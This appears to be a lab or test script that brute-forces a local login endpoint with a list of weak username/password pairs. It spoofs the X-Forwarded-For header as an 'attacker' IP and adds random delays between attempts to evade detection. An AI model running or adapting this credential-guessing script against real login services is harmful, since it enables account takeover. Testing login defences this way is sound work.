import random
import requests
import time

TARGET = "http://127.0.0.1:5000/login"


CREDENTIALS = [
    ("admin", "admin"),
    ("user", "password"),
    ("test", "123456"),
    ("user2", "sadasd"),
    ("user3", "user123"),
    ("user4", "qwerty"),
    ("user5", "asdgxcxv"),
    ("user6", "ghtytfgh"),
    ("user7", "random"),
]

IP_POOL = [
    "10.15.11.21",
    "10.15.11.22",
    "10.15.11.23",
    "10.15.11.24",
    "10.15.11.25",
    "10.15.11.26",
    "10.15.11.27",
    "10.15.11.28",
    "10.15.11.29",
]


ATTACKER_IP =  "10.15.11.21"
  


for username, password in CREDENTIALS:

    headers = {
        "X-Forwarded-For": ATTACKER_IP
    }

    data = {
        "username": username,
        "password": password
    }

    r = requests.post(TARGET, data=data, headers=headers)
    print(f"[{ATTACKER_IP}] {username}:{password} -> {r.status_code}")

    time.sleep(random.uniform(0.3, 1.2))